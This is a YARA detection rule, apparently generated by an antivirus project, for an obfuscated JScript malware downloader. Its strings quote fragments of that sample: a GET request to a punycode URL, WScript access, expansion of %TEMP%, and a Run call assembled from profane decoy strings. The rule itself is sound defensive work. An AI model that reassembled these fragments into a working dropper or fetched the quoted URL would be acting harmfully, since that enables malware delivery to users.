rule sig_20160428_ee1495ee057a040221846cc46e54b610 {
  meta:
    description = "datamaliciousorder - file 20160428_ee1495ee057a040221846cc46e54b610.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "40b3b7435d386e281fe8e40556a0647ba531102ee62d07e1770440e9ded43b7e"

  strings:
    $s1  = "BzzYyiCcyQokXhxZjyJqx[MvvAmkLnvSwvRduSbmNcp](\"G\" + \"ET\", \"http://xn--12ct7bab7ccc0ga4bik3a2b1koa4km8d.com/zmd7jf\", false);" ascii
    $s2  = "var KunJnyWhnEepKmmPvmIgq = function FpoFmtErlSniFxxKhwCom() {return ThgSuiYubSyeFikYrkTbe[InvQmnLrxIfpEraLeeRej](\"WScript\"+\"" ascii
    $s3  = "function LnnTbeWprHuxXgkUfwKfg(RqhQjtNpkUgmPwhJvjNro){KunJnyWhnEepKmmPvmIgq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var KunJnyWhnEepKmmPvmIgq = function FpoFmtErlSniFxxKhwCom() {return ThgSuiYubSyeFikYrkTbe[InvQmnLrxIfpEraLeeRej](\"WScript\"+\"" ascii
    $s5  = "function LnnTbeWprHuxXgkUfwKfg(RqhQjtNpkUgmPwhJvjNro){KunJnyWhnEepKmmPvmIgq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s6  = "function ZfsAppOknBfqPubNgmXpl() {return KunJnyWhnEepKmmPvmIgq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s7  = "function KpvOdmJwnEhfTksZpcNnj(EkrIztSgtZvaGrvOnfFkt, SkpNnpJntEurGeoSqnVyi){WsfOhpFiqTvhBbcHozGvb = WsfOhpFiqTvhBbcHozGvb * 1; " ascii
    $s8  = "return EkrIztSgtZvaGrvOnfFkt - SkpNnpJntEurGeoSqnVyi;};" fullword ascii
    $s9  = "var ThgSuiYubSyeFikYrkTbe = this[\"WScript\"];" fullword ascii
    $s10 = "function ZfsAppOknBfqPubNgmXpl() {return KunJnyWhnEepKmmPvmIgq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function EezRuwKshYvyHuuQndYbl(){return BgnOjmGbiVinNxtEosBhi + \"\";};" fullword ascii
    $s12 = "function KpvOdmJwnEhfTksZpcNnj(EkrIztSgtZvaGrvOnfFkt, SkpNnpJntEurGeoSqnVyi){WsfOhpFiqTvhBbcHozGvb = WsfOhpFiqTvhBbcHozGvb * 1; " ascii
    $s13 = "if (BzzYyiCcyQokXhxZjyJqx[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function IbaVmuGgrJigAxcIeyKfs() {return ((JouCxeRntSmpXzlAicOjn == true) && (JouCxeRntSmpXzlAicOjn == UvbIseFpzMdhEuvMmtGlw)) ?" ascii
    $s15 = "function IbaVmuGgrJigAxcIeyKfs() {return ((JouCxeRntSmpXzlAicOjn == true) && (JouCxeRntSmpXzlAicOjn == UvbIseFpzMdhEuvMmtGlw)) ?" ascii
    $s16 = "}while (QzfTryGnqVozIydRvwUlk);" fullword ascii
    $s17 = "var BttOasXvrRrrJfgXfrZib = false;" fullword ascii
    $s18 = "function LsrEsyZzaKmzVniSmaUas(){return InvQmnLrxIfpEraLeeRej;};" fullword ascii
    $s19 = "var UvbIseFpzMdhEuvMmtGlw = false;" fullword ascii
    $s20 = "var JouCxeRntSmpXzlAicOjn = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}